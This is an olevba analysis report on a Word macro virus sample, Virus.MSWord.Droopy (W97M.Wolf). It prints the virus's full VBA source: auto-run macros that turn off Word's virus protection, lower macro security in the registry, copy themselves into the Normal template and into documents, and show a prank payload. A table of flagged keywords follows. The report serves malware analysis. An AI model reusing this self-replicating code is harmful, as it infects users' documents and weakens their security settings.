olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Droopy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Droopy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wolf.bas 
in file: Virus.MSWord.Droopy - OLE stream: 'Macros/VBA/Wolf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Call EndProtect
    Call Infection
    Call SearchF
    If Day(Now) = 15 Then Call Payload
End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
MsgBox "Very Thanx to Tex Avery. hahahahaha", vbInformation, "W97M.Wolf.A"
Application.UserName = "My Name is Wolf"
End Sub

Sub AutoClose()
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Wolf"
    .Title = "My Friend the Wolf"
    .Subject = "Tex Avery and the other"
    .Keywords = "Wolf, Tex Avery, Ed Love, Droopy"
    .Comments = "No comments"
    .Execute
End With
If Left(ActiveDocument.Name, 8) <> "Document" And ActiveDocument.Saved = False Then
ActiveDocument.Save
End If
End Sub
Sub Infection()
On Error Resume Next
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
DropFile = "C:\Wolf.sys"
If Nor.Item("Wolf").Name <> "Wolf" Then
    Doc("Wolf").Export DropFile
    Nor.Import DropFile
End If
If Doc.Item("Wolf").Name <> "Wolf" Then
    Nor("Wolf").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If
End Sub

Sub SearchF()
With Application.FileSearch
    .FileName = "*.doc"
    .LookIn = "C:\"
    .SearchSubFolders = False
    .FileType = msoFileTypeWordDocuments
    .Execute
    For I = 1 To .FoundFiles.Count
        FileSystem.SetAttr .FoundFiles(I), vbNormal
    Next I
End With
End Sub

Sub EndProtect()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub Payload()
    MyApp = Shell("notepad.exe", 1)
    SendKeys "This is my last Word97Macro virus.", True
    AppActivate (MyApp)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |notepad.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

